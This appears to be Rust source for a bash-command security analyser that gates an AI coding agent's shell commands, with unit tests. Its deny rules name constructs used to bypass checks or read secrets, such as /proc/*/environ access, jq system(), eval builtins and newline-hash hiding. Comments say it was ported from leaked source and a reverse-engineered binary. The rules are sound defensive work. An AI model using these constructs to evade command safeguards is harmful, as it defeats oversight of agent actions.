/// AST extraction). The reason strings are 1:1 with the TS.
#[must_use]
pub fn pre_check_too_complex(cmd: &str) -> Option<&'static str> {
    if control_char_re().is_match(cmd) {
        return Some("Contains control characters");
    }
    if unicode_whitespace_re().is_match(cmd) {
        return Some("Contains Unicode whitespace");
    }
    if backslash_whitespace_re().is_match(cmd) {
        return Some("Contains backslash-escaped whitespace");
    }
    if zsh_tilde_bracket_re().is_match(cmd) {
        return Some("Contains zsh ~[ dynamic directory syntax");
    }
    if zsh_equals_expansion_re().is_match(cmd) {
        return Some("Contains zsh =cmd equals expansion");
    }
    if brace_with_quote_re().is_match(&mask_braces_in_quoted_contexts(cmd)) {
        return Some("Contains brace with quote character (expansion obfuscation)");
    }
    None
}

/// Parse a bash command and extract a flat list of simple commands for security
/// analysis (TS `parseForSecurity` / `parseForSecurityFromAst`).
///
/// Empty → `Simple{[]}`; a pre-check differential → `TooComplex`; parser
/// unavailable / over-length → `ParseUnavailable` (the caller keeps the legacy
/// battery); otherwise the AST is walked via [`walk_program`] →
/// `Simple{commands}` | `TooComplex{reason}`. The security asymmetry holds: any
/// unhandled/ambiguous node fails closed (over-ask), never silently `Simple`.
#[must_use]
pub fn parse_for_security(cmd: &str) -> ParseForSecurityResult {
    // TS: `if (cmd === '') return { kind: 'simple', commands: [] }`.
    if cmd.is_empty() {
        return ParseForSecurityResult::Simple { commands: Vec::new() };
    }
    // Pre-checks run before trusting tree-sitter (the known differentials).
    if let Some(reason) = pre_check_too_complex(cmd) {
        return ParseForSecurityResult::TooComplex {
            reason: reason.to_string(),
        };
    }
    // TS `parseForSecurity`: `root === null => parse-unavailable`. Over-length /
    // unparseable → `parse_raw` returns `None` → `ParseUnavailable` (the caller
    // keeps the legacy battery), exactly like TS — NOT routed to `TooComplex`.
    let tree = match crate::bash_tree_sitter::parse_raw(cmd) {
        Some(t) => t,
        None => return ParseForSecurityResult::ParseUnavailable,
    };
    // TS: `const trimmed = cmd.trim(); if (trimmed === '') return simple[]`.
    if cmd.trim().is_empty() {
        return ParseForSecurityResult::Simple { commands: Vec::new() };
    }
    // DEFER (PARSE_ABORTED): TS fail-CLOSES (`TooComplex`, nodeType `PARSE_ABORT`,
    // reason "Parser aborted (timeout or resource limit) — possible adversarial
    // input") when the parse hits the node/time budget. tree-sitter-bash 0.25.1
    // here has no budget (see `bash_tree_sitter::parse_raw`), so that branch is
    // UNREACHABLE today; wire it only if a parse-timeout API is added — and use
    // the real 2.1.195 binary string then, which is NEWER than the TS source.
    walk_program(tree.root_node(), cmd.as_bytes())
}

/// TS `walkProgram` (ast.ts:462). Drive [`collect_commands`] over the program
/// root with a fresh `var_scope`. The ERROR-node check is folded into
/// `collect_commands` — any unhandled node type (including `ERROR`) falls through
/// to `too_complex` in the default branch. `Simple{commands}` on success;
/// the propagated `TooComplex` otherwise.
#[must_use]
pub fn walk_program(root: Node, src: &[u8]) -> ParseForSecurityResult {
    let mut commands: Vec<SimpleCommand> = Vec::new();
    let mut var_scope: HashMap<String, String> = HashMap::new();
    if let Some(err) = collect_commands(root, &mut commands, &mut var_scope, src) {
        return err;
    }
    ParseForSecurityResult::Simple { commands }
}

// ────────────────────────────────────────────────────────────────────────────
// L4: semantic safety check (`checkSemantics`).
//
// Faithful 1:1 port of `ast.ts` `checkSemantics` (2213-2680): the per-command
// name/argv-based safety battery that runs AFTER the AST extraction succeeds. It
// strips safe wrapper commands (time/nohup/timeout/nice/env/stdbuf) so the
// WRAPPED command is checked, then rejects eval-like builtins, subscript-eval
// builtins, /proc/*/environ access, newline-in-argv obfuscation, jq system()/
// dangerous flags, zsh dangerous builtins, shell-keyword-as-command, etc.
//
// SECURITY ASYMMETRY: every ambiguous wrapper-strip case fails CLOSED (Deny) so
// a wrapper can never hide the real command from the per-command checks.
//
// FOUNDATION ONLY: like [`parse_for_security`]'s walker, this has NO production
// caller yet — the behavior-flip that routes [`SemanticCheckResult::Deny`] into
// the permission decision is a deliberately deferred separate step. Hence the
// `#[allow(dead_code)]` (the tests below are its only consumers in a prod build).
//
// ⚠️ ORACLE = the 2.1.195 BINARY (not the leaked `claude-code/src`, which is an
// OLDER ≈2.1.83 snapshot whose `checkSemantics` is a strict SUBSET). This function
// is ported from the minified `checkSemantics`/`Mra` recovered from the 2.1.195
// binary's embedded bundle (`/Users/luolingfeng/.local/bin/claude`), so it is the
// FULL superset: path-aware wrapper strip incl. `command`/`builtin`/`noglob`;
// subscript-eval with `-t`; `[[ … ]]` non-numeric arith operands; the zsh-aware
// `read` flag machine; the declare/typeset/export/readonly/private/float/integer
// family; `printf`/`set -o`/`set -<letter>`/`print -P`/`jobs -x`; jq
// `include/import` + widened code/file flags; `find` action-primaries + unquoted
// globs; and the `watch`/`flock`/… runs-its-argument family. Branch ORDER and
// reason strings are byte-faithful to the binary; newline-`#` is DEFERRED (only
// returned if nothing else denied), exactly as the binary's `t??=` does.
// ────────────────────────────────────────────────────────────────────────────

/// Verdict of [`check_semantics`] (TS `SemanticCheckResult`, ast.ts:2206:
/// `{ ok: true } | { ok: false; reason: string }`).
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) enum SemanticCheckResult {
    /// The command battery found nothing unsafe.
    Ok,
    /// An unsafe construct was found → the caller must ask. `reason` is
    /// byte-faithful to the TS reason string.
    Deny {
        /// Human-readable reason (byte-faithful to the TS).
        reason: String,
    },
}

/// TS `A1n` — render placeholder tokens for display inside reason strings.
#[allow(dead_code)]
fn a1n_display(s: &str) -> String {
    s.replace(CMDSUB_PLACEHOLDER, "$(\u{2026})")
        .replace(VAR_PLACEHOLDER, "${\u{2026}}")
}

/// TS `Prp` — true iff `text` contains an unquoted glob metacharacter (`*`, `?`,
/// `[`) outside single/double quotes, backticks, and `#` comments. A quote-aware
/// scan over the raw command text (used by the `find` battery).
#[allow(dead_code)]
fn find_unquoted_glob(text: &str) -> bool {
    let b: Vec<char> = text.chars().collect();
    let n = b.len();
    let mut in_sq = false; // t: single quote
    let mut in_dq = false; // n: double quote
    let mut in_bt = false; // r: backtick
    let mut at_cmd_start = true; // o: at a command-start position (for `#`)
    let mut s = 0usize;
    while s < n {
        let c = b[s];
        if in_bt {
            if c == '\\' && matches!(b.get(s + 1), Some('`') | Some('\\') | Some('$')) {
                s += 2;
            } else {
                if c == '`' {
                    in_bt = false;
                }
                s += 1;
            }
        } else if in_sq {
            if c == '\'' {
                in_sq = false;
            }
            s += 1;
        } else if in_dq {
            if c == '\\' && matches!(b.get(s + 1), Some('"') | Some('\\') | Some('`')) {
                s += 2;
            } else if c == '`' {
                in_bt = true;
                s += 1;
            } else {
                if c == '"' {
                    in_dq = false;
                }
                s += 1;
            }
        } else if c == '\\' && s + 1 < n {
            if b[s + 1] != '\n' {
                at_cmd_start = false;
            }
            s += 2;
        } else if c == '#' && at_cmd_start {
            while s < n && b[s] != '\n' {
                s += 1;
            }
            at_cmd_start = true;
        } else if c == '`' {
            in_bt = true;
            at_cmd_start = false;
            s += 1;
        } else {
            if c == '*' || c == '?' || c == '[' {
                return true;
            }
            if c == '\'' {
                in_sq = true;
            } else if c == '"' {
                in_dq = true;
            }
            at_cmd_start = matches!(
                c,
                ' ' | '\t' | '\n' | ';' | '|' | '&' | '(' | ')' | '<' | '>'
            );
            s += 1;
        }
    }
    false
}

/// TS `checkSemantics` (2.1.195 binary `Mra`). Run the per-command name/argv
/// safety battery over the extracted [`SimpleCommand`]s. [`SemanticCheckResult::Ok`]
/// if nothing unsafe; [`SemanticCheckResult::Deny`] (fail-closed) otherwise.
/// Branch order and reason strings are byte-faithful to the 2.1.195 binary.
#[must_use]
#[allow(dead_code)]
pub(crate) fn check_semantics(commands: &[SimpleCommand]) -> SemanticCheckResult {
    // TS `t`: a deferred newline-hash verdict, returned only if no earlier check
    // produced an immediate Deny across ALL commands.
    let mut deferred: Option<String> = None;
    for cmd in commands {
        // Working argv (`r`), narrowed as safe command-prefix wrappers are stripped.
        let mut a: &[String] = &cmd.argv;
        // ── Strip command-prefix wrappers (path-aware): time/nohup/timeout/nice/
        // stdbuf/env/command (matched on the basename) + builtin/noglob (raw). ──
        loop {
            let raw0 = match a.first() {
                Some(s) => s.as_str(),
                None => break,
            };
            let base = raw0.rsplit(['/', '\\']).next().unwrap_or(raw0);
            let l = if matches!(
                base,
                "time" | "nohup" | "timeout" | "nice" | "stdbuf" | "env" | "command"
            ) {
                base
            } else {
                raw0
            };
            match l {
                "time" | "nohup" => {
                    a = &a[1..];
                }
                "timeout" => {
                    let mut c = 1usize;
                    while c < a.len() {
                        let u = a[c].as_str();
                        if u == "--foreground" || u == "--preserve-status" || u == "--verbose" {
                            c += 1;
                        } else if timeout_long_value_re().is_match(u) {
                            c += 1;
                        } else if (u == "--kill-after" || u == "--signal")
                            && a.get(c + 1).map_or(false, |v| timeout_value_re().is_match(v))
                        {
                            c += 2;
                        } else if u.starts_with("--") {
                            return SemanticCheckResult::Deny {
                                reason: format!("timeout with {u} flag cannot be statically analyzed"),
                            };
                        } else if u == "-v" {
                            c += 1;
                        } else if (u == "-k" || u == "-s")
                            && a.get(c + 1).map_or(false, |v| timeout_value_re().is_match(v))
                        {
                            c += 2;
                        } else if timeout_ks_fused_re().is_match(u) {
                            c += 1;
                        } else if u.starts_with('-') {
                            return SemanticCheckResult::Deny {
                                reason: format!("timeout with {u} flag cannot be statically analyzed"),
                            };
                        } else {
                            break;
                        }
                    }
                    match a.get(c) {
                        Some(dur) if timeout_duration_re().is_match(dur) => {
                            a = &a[c + 1..];
                        }
                        Some(dur) => {
                            return SemanticCheckResult::Deny {
                                reason: format!("timeout duration '{dur}' cannot be statically analyzed"),
                            };
                        }
                        None => break,
                    }
                }
                "nice" => {
                    if a.get(1).map(String::as_str) == Some("-n")
                        && a.get(2).map_or(false, |v| nice_n_value_re().is_match(v))
                    {
                        a = &a[3..];
                    } else if a.get(1).map_or(false, |v| nice_legacy_re().is_match(v)) {
                        a = &a[2..];
                    } else if a
                        .get(1)
                        .map_or(false, |v| nice_expansion_re().is_match(v) || contains_any_placeholder(v))
                    {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "nice argument '{}' contains expansion \u{2014} cannot statically determine wrapped command",
                                a[1]
                            ),
                        };
                    } else {
                        a = &a[1..];
                    }
                }
                "env" => {
                    let mut c = 1usize;
                    while c < a.len() {
                        let u = a[c].as_str();
                        if u.contains('=') && !u.starts_with('-') {
                            c += 1;
                        } else if u == "-i" || u == "-0" || u == "-v" {
                            c += 1;
                        } else if u == "-u" && a.get(c + 1).is_some() {
                            c += 2;
                        } else if u.starts_with('-') {
                            return SemanticCheckResult::Deny {
                                reason: format!("env with {u} flag cannot be statically analyzed"),
                            };
                        } else {
                            break;
                        }
                    }
                    if c < a.len() {
                        a = &a[c..];
                    } else {
                        break;
                    }
                }
                "stdbuf" => {
                    let mut c = 1usize;
                    while c < a.len() {
                        let u = a[c].as_str();
                        if stdbuf_short_sep_re().is_match(u) && a.get(c + 1).is_some() {
                            c += 2;
                        } else if stdbuf_short_fused_re().is_match(u) {
                            c += 1;
                        } else if stdbuf_long_re().is_match(u) {
                            c += 1;
                        } else if u.starts_with('-') {
                            return SemanticCheckResult::Deny {
                                reason: format!("stdbuf with {u} flag cannot be statically analyzed"),
                            };
                        } else {
                            break;
                        }
                    }
                    if c > 1 && c < a.len() {
                        a = &a[c..];
                    } else {
                        break;
                    }
                }
                "command" => {
                    let mut c = 1usize;
                    let mut saw_v = false;
                    while c < a.len() && a[c].starts_with('-') && a[c] != "--" {
                        let d = a[c].as_str();
                        if !command_pvv_re().is_match(d) {
                            return SemanticCheckResult::Deny {
                                reason: format!("command with {d} flag cannot be statically analyzed"),
                            };
                        }
                        if d.contains('v') || d.contains('V') {
                            saw_v = true;
                        }
                        c += 1;
                    }
                    if a.get(c).map(String::as_str) == Some("--") {
                        c += 1;
                    }
                    if saw_v || c >= a.len() {
                        break;
                    }
                    a = &a[c..];
                }
                _ => {
                    if raw0 == "builtin" || raw0 == "noglob" {
                        let c = if raw0 == "builtin" && a.get(1).map(String::as_str) == Some("--") {
                            2
                        } else {
                            1
                        };
                        if c < a.len() {
                            a = &a[c..];
                        } else {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
        }

        // ── Command name (`o`). ──
        let o = match a.first() {
            Some(n) => n.as_str(),
            None => continue,
        };
        if o.is_empty() {
            return SemanticCheckResult::Deny {
                reason: "Empty command name \u{2014} argv[0] may not reflect what bash runs".to_string(),
            };
        }
        if contains_any_placeholder(o) {
            return SemanticCheckResult::Deny {
                reason: "Command name is runtime-determined (placeholder argv[0])".to_string(),
            };
        }
        if o.starts_with('-') || o.starts_with('|') || o.starts_with('&') {
            return SemanticCheckResult::Deny {
                reason: "Command appears to be an incomplete fragment".to_string(),
            };
        }

        // ── Subscript-eval flag builtins (`uoo`). ──
        let is_test = o == "test" || o == "[" || o == "[[";
        if let Some(flags) = SUBSCRIPT_EVAL_FLAGS
            .iter()
            .find(|(k, _)| *k == o)
            .map(|(_, v)| *v)
        {
            for ai in 1..a.len() {
                let l = a[ai].as_str();
                let c = a.get(ai + 1).map(String::as_str);
                if flags.contains(&l)
                    && c.map_or(false, |c| c.contains('[') || contains_any_placeholder(c))
                {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o} {l}' operand contains array subscript or runtime-determined value \u{2014} bash evaluates $(cmd) in subscripts"
                        ),
                    };
                }
                if is_test {
                    if l == "-t" && c.map_or(false, |c| !numeric_arith_re().is_match(c)) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'{o} -t' operand is non-numeric \u{2014} zsh arith-evals identifiers (may run $(cmd))"
                            ),
                        };
                    }
                    continue;
                }
                let lb = l.as_bytes();
                // Combined short flags (`-rv name[…]`): inspect the NEXT arg.
                if l.len() > 2 && lb[0] == b'-' && lb[1] != b'-' && !l.contains('[') {
                    for u in flags {
                        if u.len() == 2 && l.contains(&u[1..2]) {
                            if a
                                .get(ai + 1)
                                .map_or(false, |d| d.contains('[') || contains_any_placeholder(d))
                            {
                                return SemanticCheckResult::Deny {
                                    reason: format!(
                                        "'{o} {u}' (combined in '{l}') operand contains array subscript \u{2014} bash evaluates $(cmd) in subscripts"
                                    ),
                                };
                            }
                        }
                    }
                }
                // Fused form (`-vname[…]`): inspect WITHIN the flag arg.
                if l.len() > 2 && lb[0] == b'-' && o != "read" {
                    for u in flags {
                        if u.len() != 2 {
                            continue;
                        }
                        let uc = &u[1..2];
                        let d = match l[1..].find(uc) {
                            Some(idx) => idx + 1,
                            None => continue,
                        };
                        if d == l.len() - 1 {
                            continue;
                        }
                        let p = &l[d + 1..];
                        if ident_subscript_re().is_match(p) || contains_any_placeholder(p) {
                            return SemanticCheckResult::Deny {
                                reason: format!(
                                    "'{o} {u}' (fused in '{l}') operand contains array subscript \u{2014} bash evaluates $(cmd) in subscripts"
                                ),
                            };
                        }
                    }
                }
            }
        }

        // ── `[[ X OP Y ]]` arithmetic comparison: operands are arith-evaluated. ──
        if is_test {
            for ai in 2..a.len() {
                if !TEST_ARITH_CMP_OPS.contains(&a[ai].as_str()) {
                    continue;
                }
                for nb in [a.get(ai - 1), a.get(ai + 1)] {
                    let Some(nb) = nb else { continue };
                    if nb.contains('[') || !numeric_arith_re().is_match(nb) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'{o} ... {} ...' operand is non-numeric \u{2014} `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
                                a[ai]
                            ),
                        };
                    }
                }
            }
        }

        // ── `read`/`unset` NAME operands (with the zsh-aware read flag machine). ──
        if BARE_SUBSCRIPT_NAME_BUILTINS.contains(&o) {
            #[derive(PartialEq)]
            enum St {
                None,
                Numeric,
                Prompt,
                Str,
            }
            let mut state = St::None;
            for li in 1..a.len() {
                let c = a[li].as_str();
                if state != St::None {
                    let u = std::mem::replace(&mut state, St::None);
                    if u == St::Numeric && !read_numeric_re().is_match(c) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'read {}' operand '{c}' is non-numeric \u{2014} zsh arith-evals subscripts/expressions (may run $(cmd))",
                                a[li - 1]
                            ),
                        };
                    }
                    if u == St::Prompt
                        && (subscripted_name_re().is_match(c)
                            || (c.starts_with('-') && ident_subscript_re().is_match(c))
                            || c.contains(CMDSUB_PLACEHOLDER))
                    {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'read {}' operand '{c}' is a subscripted NAME, dash-prefixed with a subscript, or runtime-determined \u{2014} zsh -p takes no operand; may arith-eval the subscript and run $(cmd)",
                                a[li - 1]
                            ),
                        };
                    }
                    continue;
                }
                if c.starts_with('-') {
                    if o == "read" {
                        if READ_NUMERIC_DATA_FLAGS.contains(&c) {
                            state = St::Numeric;
                        } else if c == "-p" {
                            state = St::Prompt;
                        } else if READ_DATA_FLAGS.contains(&c) {
                            state = St::Str;
                        } else if c.len() > 2 {
                            let cc: Vec<char> = c.chars().collect();
                            for ui in 1..cc.len() {
                                let d = format!("-{}", cc[ui]);
                                let p = READ_NUMERIC_DATA_FLAGS.contains(&d.as_str());
                                if p || READ_DATA_FLAGS.contains(&d.as_str()) {
                                    if ui == cc.len() - 1 {
                                        state = if p {
                                            St::Numeric
                                        } else if d == "-p" {
                                            St::Prompt
                                        } else {
                                            St::Str
                                        };
                                    } else {
                                        let rest: String = cc[ui + 1..].iter().collect();
                                        if p && !read_numeric_re().is_match(&rest) {
                                            return SemanticCheckResult::Deny {
                                                reason: format!(
                                                    "'read {d}' (fused in '{c}') operand is non-numeric \u{2014} zsh arith-evals subscripts/expressions (may run $(cmd))"
                                                ),
                                            };
                                        } else if d == "-p" {
                                            let m: String = cc[ui + 1..].iter().collect();
                                            if ident_subscript_re().is_match(&m)
                                                || m.contains(CMDSUB_PLACEHOLDER)
                                            {
                                                return SemanticCheckResult::Deny {
                                                    reason: format!(
                                                        "'read -p' fused remainder '{m}' contains a subscripted identifier or cmdsub \u{2014} on zsh (-p is no-arg) this may reach matheval via a following option and run $(cmd)"
                                                    ),
                                                };
                                            }
                                        }
                                        break;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                    continue;
                }
                if c.contains('[') || contains_any_placeholder(c) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' positional NAME '{c}' contains array subscript or runtime-determined value \u{2014} bash evaluates $(cmd) in subscripts"
                        ),
                    };
                }
            }
        }

        // ── declare/typeset/local/export/readonly/private/print/set/… family. ──
        if DECLARE_FAMILY.contains(&o) {
            let is_dtl = o == "declare" || o == "typeset" || o == "local";
            let is_dtler = is_dtl || o == "export" || o == "readonly";
            for ci in 1..a.len() {
                let u = a[ci].as_str();
                if is_dtl && declare_niaAEF_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' with -n/-i/-a/-A/-E/-F flag (reached as plain command via wrapper/quote) changes assignment eval semantics"
                        ),
                    };
                }
                if ZSH_TYPESET_FAMILY.contains(&o) && declare_iEF_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' with -i/-E/-F flag (reached as plain command via wrapper/quote) \u{2014} zsh bin_typeset mathevals the RHS"
                        ),
                    };
                }
                if (is_dtler || o == "private") && declare_m_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o}' with -m/+m flag (reached as plain command via wrapper/quote) \u{2014} zsh pattern-assigns every matching variable"
                        ),
                    };
                }
                if ZSH_TYPESET_FAMILY.contains(&o) && declare_T_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "'{o} -T' creates a user-defined zsh tied pair \u{2014} tracked literals for its operands are unreliable"
                        ),
                    };
                }
                let d = u.contains('[') && subscript_expansion_re().is_match(u);
                if d || contains_any_placeholder(u) {
                    return SemanticCheckResult::Deny {
                        reason: if d {
                            format!(
                                "'{o}' operand '{}' contains array subscript with expansion \u{2014} shell arith-evals $(cmd) in subscripts",
                                a1n_display(u)
                            )
                        } else {
                            format!(
                                "'{o}' operand '{}' is runtime-determined and may carry an array subscript \u{2014} shell arith-evals $(cmd) in subscripts",
                                a1n_display(u)
                            )
                        },
                    };
                }
                if (o == "float" || o == "integer") && !leading_sign_re().is_match(u) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "zsh '{o}' operand \u{2014} implicit typeset -E/-i arithmetically evaluates the (existing or assigned) value"
                        ),
                    };
                }
            }
        }

        // ── printf: %d/%i operands are arith-evaluated on zsh. ──
        if o == "printf" {
            for ai in 1..a.len() {
                let l = a[ai].as_str();
                let c = l.contains('[') && subscript_expansion_re().is_match(l);
                if c || contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: if c {
                            format!(
                                "printf operand '{}' contains array subscript with expansion \u{2014} zsh arith-evals %d/%i operands (may run $(cmd))",
                                a1n_display(l)
                            )
                        } else {
                            format!(
                                "printf operand '{}' is runtime-determined and may carry an array subscript \u{2014} zsh arith-evals %d/%i operands (may run $(cmd))",
                                a1n_display(l)
                            )
                        },
                    };
                }
            }
        }

        // ── set -o/+o <opt> and set -<letter>: shell option changes. ──
        if o == "set" {
            let mut ai = 1usize;
            while ai < a.len() {
                let l = a[ai].as_str();
                if l == "--" {
                    break;
                }
                if !set_flag_re().is_match(l) {
                    ai += 1;
                    continue;
                }
                let cc: Vec<char> = l.chars().collect();
                let mut ci = 1usize;
                while ci < cc.len() {
                    let u = cc[ci];
                    if u == 'o' {
                        let d: Option<String> = if ci < cc.len() - 1 {
                            Some(cc[ci + 1..].iter().collect())
                        } else {
                            a.get(ai + 1).map(|s| s.to_string())
                        };
                        if let Some(d) = d.as_deref() {
                            if !d.is_empty()
                                && !SET_O_SAFE.contains(
                                    &d.to_lowercase().replace(['_', '-'], "").as_str(),
                                )
                            {
                                return SemanticCheckResult::Deny {
                                    reason: format!(
                                        "'set -o/+o {d}' changes shell parsing/globbing state \u{2014} can enable globsubst/extendedglob and defeat static analysis"
                                    ),
                                };
                            }
                        }
                        if ci == cc.len() - 1 {
                            ai += 1;
                        }
                        break;
                    }
                    if u == 'A' {
                        break;
                    }
                    if !SET_SAFE_LETTERS.contains(&u.to_string().as_str()) {
                        return SemanticCheckResult::Deny {
                            reason: format!(
                                "'set {}{u}' changes shell option state (allexport/keyword/\u{2026}) \u{2014} defeats static env-var analysis; see SET_O_SAFE_LETTERS",
                                cc[0]
                            ),
                        };
                    }
                    ci += 1;
                }
                ai += 1;
            }
        }

        // ── print -P: zsh prompt expansion evaluates $(cmd). ──
        if o == "print" && a.iter().any(|x| print_p_flag_re().is_match(x)) {
            for ai in 1..a.len() {
                let l = a[ai].as_str();
                if cmdsub_or_backtick_re().is_match(l) || contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: "'print -P' operand contains command substitution \u{2014} zsh prompt expansion evaluates $(cmd)".to_string(),
                    };
                }
            }
        }

        // ── jobs -x: executes its argument. ──
        if o == "jobs" {
            for ai in 1..a.len() {
                if jobs_x_re().is_match(&a[ai]) {
                    return SemanticCheckResult::Deny {
                        reason: "'jobs -x' executes its argument as a command \u{2014} cannot be statically analyzed".to_string(),
                    };
                }
            }
        }

        // ── shell reserved keyword as command name: tree-sitter mis-parse. ──
        if SHELL_KEYWORDS.contains(&o) {
            return SemanticCheckResult::Deny {
                reason: format!("Shell keyword '{o}' as command name \u{2014} tree-sitter mis-parse"),
            };
        }

        // ── jq: system(), include/import, and code/file-reading flags. ──
        if o == "jq" {
            for arg in a {
                if jq_system_re().is_match(arg) {
                    return SemanticCheckResult::Deny {
                        reason: "jq command contains system() function which executes arbitrary commands".to_string(),
                    };
                }
                if jq_include_re().is_match(arg) {
                    return SemanticCheckResult::Deny {
                        reason: "jq command contains include/import \u{2014} modules can load arbitrary .jq files via {search:\".\"} and call env or other builtins".to_string(),
                    };
                }
            }
            if a.iter().any(|arg| jq_dangerous_flags_re().is_match(arg)) {
                return SemanticCheckResult::Deny {
                    reason: "jq command contains dangerous flags that could execute code or read arbitrary files".to_string(),
                };
            }
        }

        // ── find: action primaries + unquoted globs that could glob-expand. ──
        if o == "find" {
            if find_unquoted_glob(&cmd.text) {
                return SemanticCheckResult::Deny {
                    reason: "find contains unquoted glob characters \u{2014} could glob-expand to a dangerous action before find runs".to_string(),
                };
            }
            let mut ai = 1usize;
            while ai < a.len() {
                let l = a[ai].as_str();
                if FIND_ACTION_FLAGS.contains(&l) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "find with '{l}' executes commands or modifies files \u{2014} cannot be auto-allowed by a Bash(find:*) prefix rule"
                        ),
                    };
                }
                if FIND_VALUE_FLAGS.contains(&l) || find_newer_re().is_match(l) {
                    ai += 2;
                    continue;
                }
                if contains_any_placeholder(l) {
                    return SemanticCheckResult::Deny {
                        reason: "find argument is runtime-determined \u{2014} could resolve to a dangerous action".to_string(),
                    };
                }
                if find_glob_re().is_match(l) {
                    return SemanticCheckResult::Deny {
                        reason: format!(
                            "find argument '{l}' contains glob characters \u{2014} could glob-expand to a dangerous action"
                        ),
                    };
                }
                ai += 1;
            }
        }

        // ── zsh module/dangerous builtins (name-based). ──
        if ZSH_DANGEROUS_BUILTINS.contains(&o) {
            return SemanticCheckResult::Deny {
                reason: format!("Zsh builtin '{o}' can bypass security checks"),
            };
        }

        // ── eval-like builtins (with fc/compgen list-only carve-outs). ──
        if EVAL_LIKE_BUILTINS.contains(&o) {
            if o == "fc" && !a.iter().skip(1).any(|x| fc_exec_re().is_match(x)) {
                // `fc -l` (list history) — safe.
            } else if o == "compgen" && !a.iter().skip(1).any(|x| compgen_exec_re().is_match(x)) {
                // `compgen -v` (list completions) — safe.
            } else {
                return SemanticCheckResult::Deny {
                    reason: format!("'{o}' evaluates arguments as shell code"),
                };
            }
        }

        // ── commands that run their argument as a command (watch/flock/…). ──
        if RUNS_ARG_COMMANDS.contains(&o) && a.len() > 1 {
            return SemanticCheckResult::Deny {
                reason: format!("'{o}' runs its argument as a command \u{2014} cannot be statically analyzed"),
            };
        }

        // ── /proc/*/environ access (argv + redirect targets). ──
        for arg in &cmd.argv {
            if arg.contains("/proc/") && proc_environ_re().is_match(arg) {
                return SemanticCheckResult::Deny {
                    reason: "Accesses /proc/*/environ which may expose secrets".to_string(),
                };
            }
        }
        for r in &cmd.redirects {
            if r.target.contains("/proc/") && proc_environ_re().is_match(&r.target) {
                return SemanticCheckResult::Deny {
                    reason: "Accesses /proc/*/environ which may expose secrets".to_string(),
                };
            }
        }

        // ── newline-`#` hiding (DEFERRED — only returned if nothing else denied). ──
        for arg in &cmd.argv {
            if arg.contains('\n') && newline_hash_re().is_match(arg) {
                deferred.get_or_insert_with(|| {
                    "Newline followed by # inside a quoted argument can hide arguments from path validation".to_string()
                });
            }
        }
        for ev in &cmd.env_vars {
            if ev.1.contains('\n') && newline_hash_re().is_match(&ev.1) {
                deferred.get_or_insert_with(|| {
                    "Newline followed by # inside an env var value can hide arguments from path validation".to_string()
                });
            }
        }
        for r in &cmd.redirects {
            if r.target.contains('\n') && newline_hash_re().is_match(&r.target) {
                deferred.get_or_insert_with(|| {
                    "Newline followed by # inside a redirect target can hide arguments from path validation".to_string()
                });
            }
        }
    }
    if let Some(reason) = deferred {
        return SemanticCheckResult::Deny { reason };
    }
    SemanticCheckResult::Ok
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── L1: const sets + leaf helpers ──

    #[test]
    fn node_type_id_pre_check_and_error() {
        assert_eq!(node_type_id(None), -2);
        assert_eq!(node_type_id(Some("ERROR")), -1);
    }

    #[test]
    fn node_type_id_dangerous_index_plus_one() {
        // Insertion order from DANGEROUS_TYPES (ast.ts:186): index+1.
        assert_eq!(node_type_id(Some("command_substitution")), 1);
        assert_eq!(node_type_id(Some("process_substitution")), 2);
        assert_eq!(node_type_id(Some("simple_expansion")), 4);
        assert_eq!(node_type_id(Some("heredoc_redirect")), 18);
        // Verify the slice is exactly 18 long and the last id matches.
        assert_eq!(DANGEROUS_TYPES.len(), 18);
        assert_eq!(
            node_type_id(Some(DANGEROUS_TYPES[DANGEROUS_TYPES.len() - 1])),
            DANGEROUS_TYPES.len() as i32
        );
    }

    #[test]
    fn node_type_id_unknown_is_zero() {
        assert_eq!(node_type_id(Some("command")), 0);
        assert_eq!(node_type_id(Some("word")), 0);
    }

    #[test]
    fn contains_any_placeholder_is_substring() {
        assert!(contains_any_placeholder(CMDSUB_PLACEHOLDER));
        assert!(contains_any_placeholder(VAR_PLACEHOLDER));
        // SUBSTRING, not equality — composites must be caught.
        assert!(contains_any_placeholder("prefix__CMDSUB_OUTPUT__"));
        assert!(contains_any_placeholder("/etc__TRACKED_VAR__suffix"));
        assert!(!contains_any_placeholder("/etc/passwd"));
        assert!(!contains_any_placeholder(""));
    }

    #[test]
    fn strip_raw_string_drops_surrounding_quotes() {
        assert_eq!(strip_raw_string("'/etc'"), "/etc");
        assert_eq!(strip_raw_string("''"), "");
        // Panic-free on a <2-char input (TS slice(1,-1) yields "").
        assert_eq!(strip_raw_string("'"), "");
        assert_eq!(strip_raw_string(""), "");
    }

    #[test]
    fn apply_var_to_scope_set_append_and_placeholder() {
        let mut scope: HashMap<String, String> = HashMap::new();
        apply_var_to_scope(&mut scope, "VAR", "/etc", false);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/etc"));
        // Append concatenates.
        apply_var_to_scope(&mut scope, "VAR", "/passwd", true);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/etc/passwd"));
        // Append of a placeholder taints the combined value.
        apply_var_to_scope(&mut scope, "VAR", CMDSUB_PLACEHOLDER, true);
        assert_eq!(scope.get("VAR").map(String::as_str), Some(VAR_PLACEHOLDER));
        // A fresh set of a literal clears the taint.
